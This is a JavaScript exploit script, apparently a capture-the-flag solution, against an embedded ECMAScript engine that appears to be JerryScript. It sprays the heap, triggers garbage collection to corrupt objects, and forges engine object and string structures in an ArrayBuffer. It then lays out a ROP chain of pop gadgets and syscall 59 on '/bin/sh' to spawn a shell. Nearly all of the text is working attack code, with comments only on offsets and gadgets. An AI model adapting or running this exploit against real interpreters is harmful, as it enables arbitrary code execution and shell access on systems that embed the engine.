//fill handler_print local_stack_buffer-> toString:assert -> sub rsp 0xe8, retn  -> handler_print local_stack_buffer ROP
//0x74A300 : global_heap + 0x6000
var ppp = new ArrayBuffer(0x4488);
var global_heap = 0x73D040 
var trigger = {toString:assert}
pad = []
for(var i=0;i<0x8;i++){
	pad[i] = []
	for(var j=0;j<0x10;j++){
		pad[i][j]=[];
		for(var k=0;k<0x10;k++){
			pad[i][j][k] = ""+undefined;
		}	
	}
}

 

bbbbbbbb = "/bin/sh\x00"
aaaaaaaa = new ArrayBuffer(8);

var size = 0x4000
var buffer = new ArrayBuffer(size);
var padd = new Uint32Array(buffer)
for(i=0;i<size/4;i++){
	padd[i] = 0x33333333
}

print("??")
//72C0

var m = 0x9FF3;
results = []
for(var j=0;j<0x1a000-m;++j){
	// 0x30003 << ECMA_DIRECT_SHIFT = 0x300030
	//  in ecma_gc_set_object_visited: object_p->type_flags_refs =  0x30030 | ECMA_OBJECT_REF_ONE = 0x30070  
	// 0x3007 -> 12295
	results.push(j)
    if(j == 0x19fff-m){
	print(j)
	gc();
    }	     
}
//obj aaaaaaa : 0x340
padd[2] = 0x46 //type psuedo
padd[3] = 0x0 //gc_next
padd[4] = (0x74D098 - global_heap)>>3 //prop_pair
padd[5] = 0x0 //outer
padd[6] = 0x00b50001    // 01 00 b5 00
padd[7] = (0x73D0B8 - 8 - global_heap)    // set arraybuffer_addr to  assert (0x73D0B8)
//property_pair 0x358
padd[8] = 0x0 //next
padd[9] = 0xc500 //type, pad
padd[10] = 0 //val0 
padd[11] = (0x74D0C0 - global_heap) | 2 //val1   string value
padd[12] = 0  //name0
padd[13] = (0x74D0B0 - global_heap)>>3  //name1 0x754368
//ecma_string name a  0x370 
padd[14] = 0x292c000B  // 0b 00 2c 29
padd[15] = 0x00010001  // 01 00 01 00
padd[16] = 0x00000061  // 61 00 00 00
padd[17] = 0x00000000
//ecma_string string value of aaaaaaaa.a 0x380
padd[18] = 0x292c000B  // 0b 00 2c 29
padd[19] = 0x01000100  // 00 10 00 10

//rop stack
padd[20] = 0x411236 
padd[21] = 0
padd[22] = 0
padd[23] = 0
padd[24] = 0x403228
padd[25] = 0
padd[26] = 0
padd[27] = 0
padd[28] = 0x400850
padd[29] = 0
padd[30] = 0x73D9B0//bin_sh
padd[31] = 0
padd[32] = 0x40033E
padd[33] = 0
padd[34] = 59
padd[35] = 0
padd[36] = 0x430018 
padd[37] = 0

//430018 syscall_3
//411236 pop rcx, retn
//403228 pop rdx, retn
//400850 pop rsi, retn
//40033E pop rdi, retn


//padd[22] = 0x4039D9 //ret
//padd[23] = 0


//need pop 0xe8
aaaaaaaa[0]=0x424B24   //pop stack 0x178



print(aaaaaaaa.a,trigger);


